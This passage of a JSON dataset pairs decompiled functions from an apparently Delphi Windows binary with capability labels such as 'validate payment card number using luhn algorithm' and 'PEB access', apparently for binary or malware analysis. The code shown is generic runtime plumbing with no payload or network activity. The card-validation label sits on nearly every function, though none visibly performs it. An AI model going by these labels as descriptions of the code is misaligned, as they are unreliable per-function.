        "decompiled_code": "\nvoid __fastcall fcn.00413ab8(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.00413ab4();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040b574(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00403f9c();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00403a05. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x463014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 198
    },
    "00413d78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00413d78(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 191
    },
    "00413dcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413dcc(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x413dd7;\n    *NULL = fcn.004035e4();\n    puStack16 = 0x413de5;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00413ed0();\n    iStack20 = 0x413e2e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00403258();\n    fcn.00403248();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x413e35;\n    iStack20 = 0x413e21;\n    fcn.00413f34();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x413e2d;\n    sub.kernel32.dll_DeleteCriticalSection_1();\n    return;\n}\n",
        "token_count": 272
    },
    "00413f34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413f34(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 42
    },
    "00414134": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00414134(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x4141ea;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.00404040();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.004031a8();\n        fcn.0040420c();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.004031a8();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040b630(1, &var_114h);\n    fcn.004039e4();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x4141f1;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 348
    },
    "0041447c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041447c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x414523;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x4144a6;\n    fcn.004145cc();\n    uStack48 = 0x414506;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41450d;\n    uStack48 = 0x414505;\n    fcn.00414688();\n    return;\n}\n",
        "token_count": 354
    },
    "0041463c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041463c(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.004150a4;\n    fcn.004145e4(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 92
    },
    "0041469c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041469c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x414731;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.004043b4();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x414738;\n    uStack44 = 0x414730;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 334
    },
    "00414748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414748(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.00414744();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040b574(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00403f9c();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00403a05. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x463014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 196
    },
    "004147d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004147d8(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4148b0;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x414806;\n    fcn.004145cc();\n    uStack52 = 0x41488e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x414895;\n    uStack52 = 0x41488d;\n    fcn.00414688();\n    return;\n}\n",
        "token_count": 352
    },
    "00414920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00414920(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x414a2b;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.00404040();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.00404268();\n            fcn.00404268();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00404098();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = fcn.00404268();\n            if (iVar2 != 0) {\n                fcn.004028b8();\n            }\n            iVar2 = fcn.00404268();\n            if (iVar2 != 0) {\n                fcn.004028b8();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x414a32;\n    uStack56 = 0x414a2a;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 426
    },
    "00414a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00414a48(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x414ac0;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x414ac7;\n    uStack36 = 0x414abf;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 266
    },
    "00414ad4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414ad4(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    uStack44 = 0x414b97;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_4h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.00415134();\n            fcn.00404190();\n            iVar1 = fcn.0040c214();\n            if (iVar1 != 0) {\n                fcn.004044c8(&fcn.00414ad4::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x00414b74;\n            }\n            var_8h = var_8h + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_8h = -1;\ncode_r0x00414b74:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x414b9e;\n    uStack44 = 0x414b8e;\n    fcn.00403fcc();\n    uStack44 = 0x414b96;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 476
    },
    "00414c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414c60(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x414cfd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x414c88;\n    fcn.004145cc();\n    uStack40 = 0x414ce0;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.004157bc();\n    fcn.00404098();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x414ce7;\n    uStack40 = 0x414cdf;\n    fcn.00414688();\n    return;\n}\n",
        "token_count": 300
    },
    "00414d0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414d0c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x414dad;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x414d3b;\n        fcn.004145cc();\n        uStack44 = 0x414d90;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x414d97;\n        uStack48 = 0x414d8f;\n        fcn.00414688();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x414db4;\n    uStack32 = 0x414dac;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 372
    },
    "00414df4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414df4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x414e98;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x414e1b;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004179ac();\n    puStack32 = 0x414e23;\n    fcn.004145cc();\n    uStack36 = 0x414e73;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.00416a48();\n        if (cVar1 != '\\0') break;\n        fcn.0041864c();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x414e7a;\n    uStack36 = 0x414e72;\n    fcn.00414688();\n    return;\n}\n",
        "token_count": 382
    },
    "004150a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004150a4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41511a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.004191f8();\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.004192a0();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    fcn.00419200();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x415121;\n    uStack36 = 0x415119;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 256
    },
    "00415474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415474(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 38
    },
    "004157bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004157bc(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 55
    },
    "004158a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004158a8(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.004031a8();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040b630(0, &var_8h);\n    fcn.004039e4();\n    return;\n}\n",
        "token_count": 116
    },
    "00415b4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415b4c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x415b68;\n    fcn.004161d0(0x1000);\n    uStackY28 = 0x415b9c;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.00418204();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x415ba3;\n    uStackY28 = 0x415b9b;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 192
    },
    "00415bac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00415bac(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "00415c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00415c70(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.00415cb4(0, in_EAX & 0xffff0000 | arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0041604c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041604c(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_DL = extraout_DL;\n    }\n    fcn.00403228();\n    fcn.00404468();\n    fcn.00416114(arg_8h);\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = arg_8h;\n    }\n    return in_EAX;\n}\n",
        "token_count": 147
    },
    "004160a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004160a4(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x416107;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.00405b0c();\n    fcn.0040b574(arg_8h_00, arg_ch);\n    fcn.004039e4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack28 = 0x41610e;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 266
    },
    "004161d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004161d0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.004026bc();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "0041631c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041631c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.00403ffc();\n    fcn.00403ffc();\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 224
    },
    "00416894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416894(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040b630(0, auStack12);\n    fcn.004039e4();\n    return;\n}\n",
        "token_count": 63
    },
    "00416b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00416b60(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    uStack36 = 0x416c6f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar4 = in_EAX[0xc];\n    if (iVar4 != 0) {\n        uStack48 = 0x416c52;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        var_ch = *(iVar4 + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < var_ch + -1) {\n            do {\n                puStack32 = puVar1;\n                puVar3 = fcn.00413b64();\n                fcn.00404040();\n                (**(*in_EAX + 0x20))();\n                iVar4 = fcn.00416450();\n                fcn.00413b64();\n                fcn.00416ae4();\n                if ((iVar4 == 0) && (cVar2 = fcn.00416374(),  cVar2 != '\\0')) {\n                    fcn.00413b64();\n                    fcn.00413e48();\n                    fcn.00413c58();\n                }\n                else {\n                    (***puVar3)();\n                }\n                var_ch = var_ch + -1;\n                puVar1 = puStack32;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = uStack52;\n        puStack44 = 0x416c59;\n        uStack48 = 0x416c51;\n        fcn.00416ca4();\n        return;\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x416c76;\n    uStack36 = 0x416c6e;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 536
    },
    "00416ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00416ce0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    iVar2 = fcn.004031a0();\n    do {\n        if (iVar2 == *0x41190c) {\n            if (*(in_EAX + 0x74) == 0) {\n                uVar4 = fcn.00413270();\n            }\n            else {\n                uVar4 = fcn.00413170();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.004131f8();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iStack20 = 0;\n            do {\n                uVar4 = **(piVar3 + iStack20 * 2 + 1);\n                cVar1 = fcn.004031bc();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iStack20 = iStack20 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.004031e4();\n    } while( true );\n}\n",
        "token_count": 301
    },
    "00416ea4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
